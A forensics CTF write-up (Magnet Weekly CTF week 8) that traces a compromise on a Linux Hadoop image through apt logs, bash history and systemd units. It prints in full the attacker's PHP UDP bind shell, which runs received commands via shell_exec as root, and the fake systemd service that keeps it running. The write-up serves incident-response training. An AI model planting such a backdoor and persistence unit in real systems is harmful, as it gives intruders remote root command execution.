---
title: Magnet Weekly CTF 8 - Incident Response
excerpt: Solution to the Magnet Forensics CTF 8th week challenge. This week's challenge asks about some installed packages and a compromise.
tags: magnet-ctf ctf forensics
author: rms
---

### Challenge 1 – 15pts

> What package(s) were installed by the threat actor? Select the most correct answer!

This challenge asks us to find a package installed by the threat actor. We know from past weeks that `apt` is used on this system to install packages. Looking at the `apt` log file found at `/var/log/apt/history.log` shows an interesting last package. 

```
Start-Date: 2019-10-07  01:30:31
Commandline: apt install php
Install: php7.0-cli:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php-common:amd64 (1:35ubuntu6.1, automatic), php7.0-fpm:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php7.0-opcache:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php7.0:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php7.0-common:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php:amd64 (1:7.0+35ubuntu6.1), php7.0-json:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php7.0-readline:amd64 (7.0.33-0ubuntu0.16.04.6, automatic)
End-Date: 2019-10-07  01:30:41
```

This particular package was the last package installed and the only package installed since 2017. It's likely this image was made in response to the attack, and it makes sense the last package installed was installed by the attacker, especially with such a time difference. 

Entering in `php` reveals it is indeed the correct solution. 
{:.success}

### Challenge 2 - 5pts

Solving the first question releases another challenge.

> Why?
    - Hosting a database
    - Serving a webpage
    - To run a php webshell
    - Create a fake systemd service

Hm. Why would a threat actor install php of all things? Maybe the bash history recorded some commands the attacker ran. Grepping the `.bash_history` file under `/home/hadoop` for `php` reveals a single command:

```
ll /usr/local/hadoop/bin/cluster.php
```

Interesting. The contents of that file:

```
<?php

error_reporting(0);

$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
//socket_set_option ($sock, SOL_SOCKET, SO_REUSEADDR, 1); 
if (socket_bind($sock, '0.0.0.0', 17001) == true) {
        $error_code = socket_last_error();
        $error_msg = socket_strerror($error_code);
        //echo "code: ", $error_code, " msg: ", $error_msg;

        for (;;) {
            socket_recvfrom($sock, $message, 1024000, 0, $ip, $port);
            $reply = shell_exec($message);
            socket_sendto($sock, $reply, strlen($reply), 0, $ip, $port);
        }
}
else {  exit;   }

?>
```

Ah. This php script loads a bind shell on port `17001` that can execute commands using `shell_exec`. This rules out using php for `Hosting a database`, `Serving a webpage`, and `To run a php webshell`. So the solution must be `Create a fake systemd service`? Lets double check. 

Using `ls -la etc/systemd/system/` we can see the system services:

```
drwxr-xr-x 12 root root 4096 Oct  6  2019 .
drwxr-xr-x  5 root root 4096 Nov  7  2017 ..
-rw-rw-r--  1 root root  246 Oct  6  2019 cluster.service
drwxr-xr-x  2 root root 4096 Nov  7  2017 default.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 final.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 getty.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 graphical.target.wants
lrwxrwxrwx  1 root root   38 Nov  7  2017 iscsi.service -> /lib/systemd/system/open-iscsi.service
drwxr-xr-x  2 root root 4096 Oct  6  2019 multi-user.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 network-online.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 paths.target.wants
drwxr-xr-x  2 root root 4096 Nov  7  2017 sockets.target.wants
lrwxrwxrwx  1 root root   31 Nov  7  2017 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x  2 root root 4096 Nov  7  2017 sysinit.target.wants
lrwxrwxrwx  1 root root   35 Nov  7  2017 syslog.service -> /lib/systemd/system/rsyslog.service
drwxr-xr-x  2 root root 4096 Nov  7  2017 timers.target.wants
```

Hm. `clsuter.php` and `cluster.service`... Let's check that out with `cat etc/systemd/system/cluster.service`. 

```
[Unit]
Description=Daemon Cluster Service
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/env php /usr/local/hadoop/bin/cluster.php

[Install]
WantedBy=multi-user.target
```

So a bind shell is created using `cluster.php` which is started via a systemd service! Entering `Create a fake systemd service` reveals it is the correct solution!
{:.success}